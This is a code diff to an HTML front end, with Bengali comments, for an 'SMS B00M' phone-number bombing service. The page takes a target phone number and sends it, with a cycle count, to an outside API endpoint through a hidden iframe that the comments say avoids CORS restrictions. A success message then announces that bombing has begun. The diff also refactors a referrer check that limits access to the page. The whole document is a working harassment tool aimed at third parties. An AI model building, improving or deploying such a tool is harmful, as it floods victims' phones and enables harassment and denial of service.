@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SMS B00M</title>
+  <title>SMS B00M | SPECIAL CELL</title>
   <style>
-    /* পূর্বের স্টাইল কোড (Style Code) */
+    /* ১. বডি ও থিম */
     body {
       margin: 0;
       padding: 0;
@@ -37,6 +37,8 @@
       text-shadow: 0 0 15px #00eaff, 0 0 25px #00eaff;
       margin-bottom: 5px;
     }
+    
+    /* ২. ইনপুট ও বাটন স্টাইল */
     input[type="number"] {
       padding: 15px;
       border-radius: 8px;
@@ -48,9 +50,6 @@
       box-shadow: 0 0 10px #00eaff88;
       outline: none;
       transition: border-color 0.3s;
-    }
-    input[type="number"]:focus {
-      border-color: #00ffff;
     }
     .btn {
       padding: 15px;
@@ -69,6 +68,8 @@
       transform: scale(1.03);
       background: #004455;
     }
+    
+    /* ৩. ড্যাশবোর্ড বাটন স্টাইল */
     .dashboard-link-btn {
         padding: 15px;
         border-radius: 12px;
@@ -89,6 +90,8 @@
         transform: scale(1.03);
         background: #550066;
     }
+    
+    /* ৪. স্ট্যাটাস মেসেজ স্টাইল */
     #status {
       margin-top: 5px;
       font-size: 16px;
@@ -100,15 +103,19 @@
 
   <script>
     (function() {
-      // চেকবক্স ১: ড্যাশবোর্ড থেকে রেফার করা হয়েছে কিনা? 
-      // যদি রেফারার URL-এ 'special_dashboard.html' বা 'dashboard.html' না থাকে...
       const referrer = document.referrer;
-      
-      // আপনার ড্যাশবোর্ডের URL-এর অংশ (যদি এটি 'dashboard.html' হয়)
-      const allowedReferrer = 'dashboard.html'; 
-      const allowedReferrer2 = 'special_dashboard.html'; // যদি আপনার আসল ড্যাশবোর্ড এটি হয়
+      // ড্যাশবোর্ডের ফাইলেসগুলো এখানে উল্লেখ করুন
+      const allowedReferrers = ['dashboard.html', 'special_dashboard.html']; 
 
-      if (!referrer.includes(allowedReferrer) && !referrer.includes(allowedReferrer2)) {
+      let isAllowed = false;
+      for (const allowed of allowedReferrers) {
+          if (referrer.includes(allowed)) {
+              isAllowed = true;
+              break;
+          }
+      }
+
+      if (!isAllowed) {
           // যদি ড্যাশবোর্ড থেকে না আসে, তবে index.html-এ রিডাইরেক্ট করে দেবে
           window.location.replace('index.html');
       }
@@ -135,16 +142,16 @@
 
     <div id="status"></div>
 
-    <a href="special_dashboard.html" class="dashboard-link-btn">ড্যাশবোর্ড</a> 
+    <a href="special_dashboard.html" class="dashboard-link-btn">ড্যাশবোর্ড</a>
   </div>
 
   <script>
-    // API কল করার ফাংশন (পূর্বের মতোই আছে)
     function triggerSMSBoom() {
         const numberInput = document.getElementById('targetNumber');
         const statusDiv = document.getElementById('status');
         const number = numberInput.value.trim();
         
+        // ১. ভ্যালিডেশন
         if (!number || number.length < 10) {
             statusDiv.textContent = 'দয়া করে সঠিক নম্বর দিন!';
             statusDiv.style.color = '#ff0055'; 
@@ -152,13 +159,17 @@
             return;
         }
 
+        // ২. API URL
         const apiUrl = `http://mahfuz-boom.gt.tc/?number=${number}&cycles=3`;
         
         statusDiv.textContent = 'SMS B00M শুরু হচ্ছে...';
         statusDiv.style.color = '#00eaff';
         statusDiv.style.textShadow = '0 0 8px #00eaff';
 
-        // Invisible Iframe পদ্ধতি ব্যবহার করে API কল
+        // ৩. Invisible Iframe ব্যবহার করে API কল করা 
+        // এই পদ্ধতি CORS সমস্যা এড়িয়ে যায়।
+
+        // পুরাতন Iframe মুছে নতুন Iframe তৈরি করা
         const oldIframe = document.getElementById('api-iframe');
         if (oldIframe) {
             oldIframe.remove();
@@ -166,29 +177,28 @@
 
         const iframe = document.createElement('iframe');
         iframe.id = 'api-iframe';
-        iframe.style.display = 'none';
+        iframe.style.display = 'none'; // অদৃশ্য রাখা
         iframe.src = apiUrl;
         
-        iframe.onload = function() {
-            statusDiv.textContent = `সফল! বোমবিং শুরু হয়েছে।`;
-            statusDiv.style.color = '#00ffaa'; 
-            statusDiv.style.textShadow = '0 0 8px #00ffaa';
-
-            setTimeout(() => {
-                iframe.remove();
-            }, 1000);
-        };
-
-        iframe.onerror = function() {
-            statusDiv.textContent = 'সতর্কতা: সংযোগে সমস্যা হতে পারে। কলটি শুরু করার চেষ্টা করা হয়েছে।';
-            statusDiv.style.color = '#ffcc00';
-            statusDiv.style.textShadow = '0 0 8px #ffcc00';
-            setTimeout(() => {
-                iframe.remove();
-            }, 1000);
-        };
-
         document.body.appendChild(iframe);
+
+        // ৪. নিশ্চিতকরণের জন্য টাইমআউট
+        // API কলটি শুরু হয়েছে তা নিশ্চিত করতে ২.৫ সেকেন্ড অপেক্ষা করা।
+        setTimeout(() => {
+            // যদি স্ট্যাটাস "শুরু হচ্ছে..." থাকে, তবে সফল বার্তা দেখাও
+            if (statusDiv.textContent === 'SMS B00M শুরু হচ্ছে...') {
+                statusDiv.textContent = `সফল! বোমবিং শুরু হয়েছে।`;
+                statusDiv.style.color = '#00ffaa'; 
+                statusDiv.style.textShadow = '0 0 8px #00ffaa';
+            }
+            
+            // Iframe-টি ডম থেকে মুছে ফেলা
+            const iframeToRemove = document.getElementById('api-iframe');
+            if (iframeToRemove) {
+                 iframeToRemove.remove();
+            }
+
+        }, 2500); // ২.৫ সেকেন্ড অপেক্ষা করা
     }
   </script>
 </body>
